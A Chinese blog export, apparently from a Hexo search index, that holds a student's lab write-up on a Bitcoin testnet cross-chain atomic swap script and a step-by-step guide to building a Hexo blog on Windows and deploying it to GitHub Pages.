<p>在这项作业中，你需要实现Alice和Bob两方之间跨链原子交换代码的关键部分。Alice在BTCTestnet3上有比特币，这是project1使用的标准比特币测试网。Bob在BCY Testnet 上拥有比特币，BCY Testnet是Blockcypher 的比特币测试网，由Blockcypher独家挖矿和维护。他们希望安全地交换各自coin的所有权，这是一个简单交易无法完成的事情，因为它们位于不同的区块链上。这里的想法是围绕一个只有一方(Alice）知道的秘密x建立交易。在这些事务中，只有H(x)将被发布，而x为秘密。交易将以这样的方式建立，一旦x被揭露，双方都可以赎回对方发送的硬币。如果x永远不会被揭露，双方将能够安全地取回他们的原始硬币，而不需要另一方的帮助。这种方法也适用于其他加密货币。</p>
</blockquote>
<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h3><blockquote>
<p>运行课程代码pip install -r requirements.txt安装所需的依赖项。确保使用的是python3。</p>
</blockquote>
<p>这个之前已经已经接安装过了这次就不用再做了</p>
<h3 id="创建BTC密钥并领取测试币"><a href="#创建BTC密钥并领取测试币" class="headerlink" title="创建BTC密钥并领取测试币"></a>创建BTC密钥并领取测试币</h3><blockquote>
<p>(a）为Alice和 Bob 创建BTC testnet密钥。你可以用keygen.py 生成密钥，把它填入keys.py中合适的地方。<br>(b）在 Project1中相同的<a href="https://coinfaucet.eu/en/btc-testnet/">coinfaucet</a> 上，为Alice的BTC地址领取测试币。</p>
</blockquote>
<p>这个也是之前做过的了，慢慢找公交车人行道自行车吧，Good Luck！</p>
<h3 id="注册BCY创建密钥领取测试币"><a href="#注册BCY创建密钥领取测试币" class="headerlink" title="注册BCY创建密钥领取测试币"></a>注册BCY创建密钥领取测试币</h3><blockquote>
</blockquote>
<p>(a）在Blockcypher注册帐户以获取API token: <a href="https://accounts.blockcypher.com/%E3%80%82">https://accounts.blockcypher.com/。</a><br>(b）为Alice和Bob创建BCY testnet密钥并填入keys.py.<br> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl-X POST https:&#x2F;&#x2F;api.blockcypher.com&#x2F;v1&#x2F;bcy&#x2F;test&#x2F;addrs?token&#x3D;YOURTOKEN</span><br></pre></td></tr></table></figure><br>(c）在Blockcypher 测试网（BCY）上为Bob的BCY地址领取测试币。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl-d&#39;&#123;&quot;address&quot;:&quot;BOB_BCY_ADDRESs&quot;, &quot;amount&quot;: 1000000&#125;&#39; https:&#x2F;&#x2F;api.blockcypher.com&#x2F;v1&#x2F;bcy&#x2F;test&#x2F;faucet?token&#x3D;YOURTOKEN</span><br></pre></td></tr></table></figure>

<p>这个相对于BTC领币过程也太“流云行水”了，curl用前需要装一下，终端输入<code>sudo apt-get install curl</code>就能装了。然后在终端里输入题目里给的命令就好</p>
<h3 id="划分测试币"><a href="#划分测试币" class="headerlink" title="划分测试币"></a>划分测试币</h3><blockquote>
<p>使用split_test_coins.py（填写文件中的相关字段）划分领取的币。</p>
</blockquote>
<p>把对应的地方填上就行，不过需要注意，划分BCY测试币的时候，注意改一下调用的函数（参考keys.py中的样式），以及network的类型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#BTC：</span><br><span class="line">my_private_key &#x3D; CBitcoinSecret(&#39;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&#39;)</span><br><span class="line">#BCY：</span><br><span class="line">my_private_key &#x3D; CBitcoinSecret.from_secret_bytes(x(&#39;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&#39;))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="完善swap-py"><a href="#完善swap-py" class="headerlink" title="完善swap.py"></a>完善swap.py</h3><blockquote>
<p>填写swap.py.</p>
</blockquote>
<p>按照提示一步一步写</p>
<h3 id="完善swap-scripts-py"><a href="#完善swap-scripts-py" class="headerlink" title="完善swap_scripts.py"></a>完善swap_scripts.py</h3><p>这部分是本次实验核心部分</p>
<h3 id="要求及源码"><a href="#要求及源码" class="headerlink" title="要求及源码"></a>要求及源码</h3><blockquote>
<p>A.考虑创建跨链原子交换所需事务所需的ScriptPubKey。此交易必须可由接收者赎回（如果他们有一个与Hash(x）对应的秘密x)，或者可以用发送者和接收者的两个签名赎回。完善swap_scripts.py 中的脚本coinExchangeScript。<br>B.完善脚本:<br>(a）在接收者知道秘密x的情况下，编写赎回交易所需的ScriptSig。在swap_scripts.py中完善coinExchangeScriptSig1.<br>(b）在发送方和接收方都签署事务的情况下，编写赎回事务所需的ScriptSig。在swap_scripts.py中完善coinExchangeScriptSig2.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coinExchangeScript</span>(<span class="params">public_key_sender, public_key_recipient, hash_of_secret</span>):</span></span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="comment"># fill this in!</span></span><br><span class="line">    ]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coinExchangeScriptSig1</span>(<span class="params">sig_recipient, secret</span>):</span></span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="comment"># fill this in!</span></span><br><span class="line">    ]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coinExchangeScriptSig2</span>(<span class="params">sig_sender, sig_recipient</span>):</span></span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="comment"># fill this in!</span></span><br><span class="line">    ]</span><br></pre></td></tr></table></figure>

<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>根据题目要求，我们的锁定脚本应该能够用两个不同解锁脚本解锁所以需要用到<code>OP_IF</code>、<code>OP_ELSE</code> 、<code>OP_ENDIF</code>等脚本语言来处理不同解锁脚本。</p>
<ul>
<li>对于用秘密X及接收者签名赎回的脚本，我们只需要先验证X的哈希值是否正确，然后再用P2PK脚本验证接收者签名</li>
<li>对于用两个签名赎回的脚本，我们只需要用P2MS就可以实现</li>
<li>对于知道秘密X的解锁脚本，我们只需将签名与秘密依次压栈</li>
<li>对于两个签名的解锁脚本，把两个签名压栈即可，不过需要注意先OP_0</li>
</ul>
<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><h5 id="解锁脚本1："><a href="#解锁脚本1：" class="headerlink" title="解锁脚本1："></a>解锁脚本1：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;sig_recipient&gt;,&lt;seret&gt;</span><br></pre></td></tr></table></figure>

<h5 id="解锁脚本2："><a href="#解锁脚本2：" class="headerlink" title="解锁脚本2："></a>解锁脚本2：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OP_0 &lt;sig_sender&gt; ,&lt;sig_recipient&gt;</span><br></pre></td></tr></table></figure>
<h5 id="锁定脚本："><a href="#锁定脚本：" class="headerlink" title="锁定脚本："></a>锁定脚本：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OP_DEPTH, 2, OP_EQUAL, </span><br><span class="line">OP_IF, </span><br><span class="line">OP_HASH160, hash_of_secret, OP_EQUALVERIFY, public_key_recipient, OP_CHECKSIG, OP_ELSE,</span><br><span class="line">2, public_key_sender, public_key_recipient, 2, OP_CHECKMULTISIG,</span><br><span class="line">OP_ENDIF</span><br></pre></td></tr></table></figure>
<h5 id="解释："><a href="#解释：" class="headerlink" title="解释："></a>解释：</h5><p>可以把锁定脚本看作三部分</p>
<ul>
<li>第一部分是用来检验是哪个解锁脚本从而执行相应的检验<br>我们可以发现两个脚本长度不同，于是可以利用这一点来分辨是哪个脚本，利用<code>OP_DEPTH</code>得到栈大小可以实现<br>或者是在第二个解锁脚本中存在一个OP_O，于是可以用<code>OP_PICK</code>将栈底复制到栈顶，然后与<code>OP_0</code>对比，这样也可以</li>
<li>第二部分是执行<code>OP_IF</code>后的分支，验证秘密X与接收者签名</li>
<li>第三部分是执行<code>OP_ELSE</code>后的分至，验证两个签名</li>
</ul>
<h5 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h5><blockquote>
<p>对于解锁脚本1+锁定脚本</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NULL							|初始状态栈为空</span><br><span class="line">&lt;sig_recipient&gt;&lt;seret&gt;		  |&lt;sig_recipient&gt;,&lt;seret&gt;依次入栈</span><br><span class="line">&lt;sig_recipient&gt;&lt;seret&gt;&lt;2&gt;	   |OP_DEPTH得到栈大小为2，并将2压栈</span><br><span class="line">&lt;sig_recipient&gt;&lt;seret&gt;&lt;2&gt;&lt;2&gt;	|2入栈</span><br><span class="line">&lt;sig_recipient&gt;&lt;seret&gt;&lt;Ture&gt;	|OP_EQUAL比较栈顶两个的值并将其pop，将Ture压栈，这里不能用OP_EQUALVERIFY，因为我们需要在栈里压入一个标志来确定执行OP_IF还是OP_ELSE</span><br><span class="line">&lt;sig_recipient&gt;&lt;seret&gt;		  |OP_IF检测栈顶值并将其pop，进入if分支</span><br><span class="line">&lt;sig_recipient&gt;&lt;hash_of_secret?&gt;|得到secret的哈希值</span><br><span class="line">&lt;sig_recipient&gt;&lt;hash_of_secret?&gt;&lt;hash_of_secret&gt;|&lt;hash_of_secret&gt;压栈</span><br><span class="line">&lt;sig_recipient&gt;		   	  |OP_EQUALVERIFY检测两个哈希值是否相等并将其pop</span><br><span class="line">&lt;sig_recipient&gt;&lt;public_key_recipient&gt;|public_key_recipient入栈</span><br><span class="line">&lt;Ture&gt;						  |OP_CHECKSIG</span><br><span class="line">&lt;Ture&gt;						  |最后几步其实就是简单的P2PK，最后的OP_ENDIF一定要加			</span><br></pre></td></tr></table></figure>
<blockquote>
<p>对于解锁脚本1+锁定脚本</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">NULL 							           |初始状态栈为空</span><br><span class="line">&lt;OP_0&gt;&lt;sig_recipient&gt;&lt;sig_recipient&gt;       |&lt;OP_0&gt;&lt;sig_recipient&gt;&lt;sig_recipient&gt;依次入栈</span><br><span class="line">&lt;OP_0&gt;&lt;sig_recipient&gt;&lt;sig_recipient&gt;&lt;3&gt;    |OP_DEPTH得到栈大小为，并将3压栈</span><br><span class="line">&lt;OP_0&gt;&lt;sig_recipient&gt;&lt;sig_recipient&gt;&lt;3&gt;&lt;2&gt; |2入栈</span><br><span class="line">&lt;OP_0&gt;&lt;sig_recipient&gt;&lt;sig_recipient&gt;&lt;False&gt;|OP_EQUAL比较栈顶两个的值并将其pop，将False压栈</span><br><span class="line">&lt;OP_0&gt;&lt;sig_recipient&gt;&lt;sig_recipient&gt;	   |OP_IF检测栈顶值，为false，不执行if分至，有OP_ELSE，跳转到else</span><br><span class="line"></span><br><span class="line">#略</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>苏明yyds</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo博客搭建（Windows）</title>
    <url>/2020/11/04/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>突然就想要有一个自己的博客，契机是NKU丨🐏开始在CSDN上发自己做过的东西，再加上之前在大二偶然发现的南开的学姐的博客上学到了好多东西，便开始着手搭建自己的博客，共费时两个晚上方有了简陋的博客。以下大概记录下建立博客的过程以及踩过的坑。</p>
<h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><h2 id="配置Github"><a href="#配置Github" class="headerlink" title="配置Github"></a>配置Github</h2><p>注册账号之类就不赘述了，新建一个<code>Repository</code>，名字必须是<code>yourusername.github.io</code>，比如我的就是<code>YozoOba.github.io</code>，选择public，其他可以跳过直接创建就好了。</p>
<h2 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h2><p>直接从官网下载<a href="https://nodejs.org/zh-cn/">node.js</a>,一路默认设置+next安装完成，安装地址可以改一下。<br>安装完成后便可以使用npm了，注意不是nmp（我用的时候一直报错，直到百度搜索的时候它提示我是不是要搜索“npm”才意识到，orz）<br>打开cmd输入<code>node -v</code>可以查看node.js版本来确认是否安装完成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\14616&gt;node -v</span><br><span class="line">v14.15.0</span><br></pre></td></tr></table></figure>
<p>这样就算安装成功了</p>
<h2 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2><p>同样直接官网下载<a href="https://git-scm.com/download/win">Git</a>，安装完成之后设置环境变量（一般安装的时候都会自动设置的，如果安装后没法使用Git可以考虑是不是没有设置环境变量）</p>
<p>下载完成后随意一个地方点右键可以打开<code>Git Bash</code>，先配置你的用户信息，在里面输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;你的GitHub用户名&quot;</span><br><span class="line">git config --global user.email &quot;你的GitHub邮箱&quot;</span><br></pre></td></tr></table></figure>
<p>然后再生成ssh密钥，这一步的目的是为设置Github密钥，这样就不用每次推送都输入密码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;你的GitHub邮箱&quot;</span><br></pre></td></tr></table></figure>
<p>然后三个回车，找到生成的<code>.ssh</code>文件夹，一般存放在<code>C\users</code>目录下，复制id_rsa.pub中的密钥。</p>
<p>也可以直接右键打开Git Gui，点击左上角<code>Help</code>中的<code>Show SSH Key </code>按照提示生成ssh密钥， 同样三个回车，它会直接显示出密钥直接复制，不需要再去文件里复制</p>
<p>接下来打开Github，在<code>Setting</code>里找到<code>SSH and GPG keys</code>新建SSH，复制你本地生成的<code>public key</code>进去，然后保存，它会让你输入Github密码，然后就成功了。</p>
<p>在Git Bash中输入ssh <a href="mailto:&#103;&#x69;&#116;&#x40;&#x67;&#x69;&#x74;&#x68;&#117;&#x62;&#x2e;&#x63;&#111;&#109;">&#103;&#x69;&#116;&#x40;&#x67;&#x69;&#x74;&#x68;&#117;&#x62;&#x2e;&#x63;&#111;&#109;</a>来验证是否成功，第一次验证的话会让你输入一个yes，显示successfully便成功了，but后面的语句不需要看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh git@github.com</span><br></pre></td></tr></table></figure>
<h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><p>hexo是通过npm命令安装的<br>首先建立一个hexo文件夹，放在你喜欢的位置，在该文件夹打开cmd或者power shell，不过推荐Git Bash，我用前两个的时候总莫名奇妙报错，用了Git Bash就顺畅许多嘿嘿。<br>安装hexo</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install -g hexo</span><br></pre></td></tr></table></figure>
<h1 id="本地建立博客"><a href="#本地建立博客" class="headerlink" title="本地建立博客"></a>本地建立博客</h1><p>在hexo文件夹下打开Git Bash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo init blog&#x2F;&#x2F;blog是项目的名字，你可以叫别的或者省略</span><br><span class="line">cd blog</span><br><span class="line">hexo g&#x2F;&#x2F;编译</span><br><span class="line">hexo s&#x2F;&#x2F;s就是server，执行完就可以通过4000端口预览网站</span><br></pre></td></tr></table></figure>
<p>在浏览器输入<code>localhost：4000</code>便可以看到一个页面，这是默认的landscape主题<br>#将博客部署到Github<br>这里我们之前在Github上配置的仓库就有了用处，首先打开blog文件夹里的_config.yml文件进行配置，找到最下方的deploy进行配置，repo后面是你对应的仓库地址，由于已经设置过ssh，所以不需要写成https之类格式。<br>注意：<strong>冒号之后一定要有一个空格，不然会报错！冒号之后一定要有一个空格，不然会报错！冒号之后一定要有一个空格，不然会报错！</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:yourname&#x2F;yourname.github.io.git&#x2F;&#x2F;填充上yourname即可</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
<p>然后安装hexo的插件，在Git Hash里输入命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>完成后输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
<p>其中<code>hexo d</code>就是将你网站部署到GitHub上的命令，完成后再访问<code>https://yourname.github.io/</code>便会惊奇的发现你能通过互联网访问到了！！！</p>
<h1 id="设置主题"><a href="#设置主题" class="headerlink" title="设置主题"></a>设置主题</h1><p>我用的是Ayer主题，作者的使用文档真的写的太太太详细了，设置主题这一部分基本没什么难度，直接参考<a href="https://shen-yu.gitee.io/2019/ayer/">Ayer</a><br>按照作者的嘱咐安装好各种插件，修改好配置文件记得加空格就没多大问题。</p>
<h1 id="博客使用"><a href="#博客使用" class="headerlink" title="博客使用"></a>博客使用</h1><p>其实执行到上一步之后我是一脸懵逼的，我究竟该怎么使用这个博客呢，为啥侧边栏就只有一个主页和一个归档能点其他都是404？？？<br>然后就去翻了好久hexo的官方文档，并且又去找了好多博客看，最后终于发现了是因为没有建立对应的page<br>按照<a href="https://shen-yu.gitee.io/2019/ayer/">Ayer</a>的提示，然后打开终端（记得要在blog文件夹打开，不然无论你输入什么都是报错）<br>首先输入以下创建分类</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo new page categories</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后将以下内容复制到/source/categories/index.md 文件中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: categories</span><br><span class="line">type: &quot;categories&quot;</span><br><span class="line">layout: &quot;categories&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>然后输入以下创建标签</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo new page tags</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>同样需要配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: tags</span><br><span class="line">type: &quot;tags&quot;</span><br><span class="line">layout: &quot;tags&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>友链、关于之类的，配置同以</p>
<p>面对着空空如也的博客，我又开始迷茫了，那标签分类这些东西该怎么生成呢，又是翻了好多博客，终于有一个博主醍醐灌顶地说了一局，标签分类是不能独立存在的，必须依赖于博文存在<br>于是输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo new &lt;hello world&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到在blog\source_posts目录下出现了我们刚才创建的文档在配置中输入相关的tags和categories然后保存，注意<strong>冒号后面要有空格不然又会报错！！！</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: hello world</span><br><span class="line">tags: yourtags</span><br><span class="line">categories: yourcategories</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>然后在终端中输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo clean </span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
<p>等到命令执行完，我们再访问博客，便会发现已经有了相对应的标签和分类，至此，博客初步搭建完成，<em>★,°</em>:.☆(￣▽￣)/$:<em>.°★</em> 。</p>
<h1 id="搭建过程中报错及解决办法"><a href="#搭建过程中报错及解决办法" class="headerlink" title="搭建过程中报错及解决办法"></a>搭建过程中报错及解决办法</h1><h2 id="关于副标题不显示的问题"><a href="#关于副标题不显示的问题" class="headerlink" title="关于副标题不显示的问题"></a>关于副标题不显示的问题</h2><p>在markdown中“#”与“##”之类的后面要先加一个空格在输入内容，否则可能不被认为是标题之类的而显示成##xxx之类的奇怪的东西</p>
<h2 id="nmp不是内部命令，也不是可运行的程序"><a href="#nmp不是内部命令，也不是可运行的程序" class="headerlink" title="nmp不是内部命令，也不是可运行的程序"></a>nmp不是内部命令，也不是可运行的程序</h2><p>orz这个是因为把npm敲成了nmp哈哈哈。</p>
<h2 id="git不是内部或外部命令-也不是可运行的程序"><a href="#git不是内部或外部命令-也不是可运行的程序" class="headerlink" title="git不是内部或外部命令,也不是可运行的程序"></a>git不是内部或外部命令,也不是可运行的程序</h2><p>这个可能是因为没有安装Git或者没有在系统变量里配置Git</p>
<h2 id="hexo-无法加载文件-因为在此系统上禁止运行脚本。"><a href="#hexo-无法加载文件-因为在此系统上禁止运行脚本。" class="headerlink" title="hexo : 无法加载文件 ,因为在此系统上禁止运行脚本。"></a>hexo : 无法加载文件 ,因为在此系统上禁止运行脚本。</h2><p>以管理员身份打开cmd或者power shell，输入<code>set-executionpolicy remotesighed</code>选择是即可解决</p>
<h2 id="hexo报错Usage-hexo"><a href="#hexo报错Usage-hexo" class="headerlink" title="hexo报错Usage: hexo "></a>hexo报错Usage: hexo <command></h2><p>这个前面提到过，是因为没有在blog文件下打开终端，只需要cd 到你创建的blog之类的文件夹就行了</p>
<h2 id="can-not-read-an-implicit-mapping-pair-a-colon-is-missed-at-line-109-column"><a href="#can-not-read-an-implicit-mapping-pair-a-colon-is-missed-at-line-109-column" class="headerlink" title="can not read an implicit mapping pair; a colon is missed at line 109, column"></a>can not read an implicit mapping pair; a colon is missed at line 109, column</h2><p>这个是前面提到的空格问题，在它报错的地方加上应该有点空格就好</p>
<h2 id="fatal-protocol-‘github-https’-is-not-supported"><a href="#fatal-protocol-‘github-https’-is-not-supported" class="headerlink" title="fatal: protocol ‘github:https’ is not supported"></a>fatal: protocol ‘github:https’ is not supported</h2><p>貌似还是因为空格问题，然后顺便把https样式的url改成了带@的那个</p>
<h2 id="Could-not-resolve-hostname-github-Name-or-service-not-known"><a href="#Could-not-resolve-hostname-github-Name-or-service-not-known" class="headerlink" title="Could not resolve hostname github: Name or service not known"></a>Could not resolve hostname github: Name or service not known</h2><p>这个我记得我是用了Git Bash就好了</p>
<h2 id="Spawn-failed"><a href="#Spawn-failed" class="headerlink" title="Spawn failed"></a>Spawn failed</h2><p>这个把博客文档里的.git删除掉，然后再在删除的地方输入以下命令新建一个仓库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure>
<h2 id="not-a-git-repository-or-any-of-the-parent-directories"><a href="#not-a-git-repository-or-any-of-the-parent-directories" class="headerlink" title="not a git repository (or any of the parent directories)"></a>not a git repository (or any of the parent directories)</h2><p>这个是因为上面那个错误把.git删了没有新建，<code>git init</code><br>之后就好了</p>
<h2 id="err-YAMLException-can-not-read-a-block-mapping-entry"><a href="#err-YAMLException-can-not-read-a-block-mapping-entry" class="headerlink" title="err: YAMLException: can not read a block mapping entry"></a>err: YAMLException: can not read a block mapping entry</h2><p>还是空格问题，找到应该加空格的地方加空格就好了</p>
]]></content>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
</search>
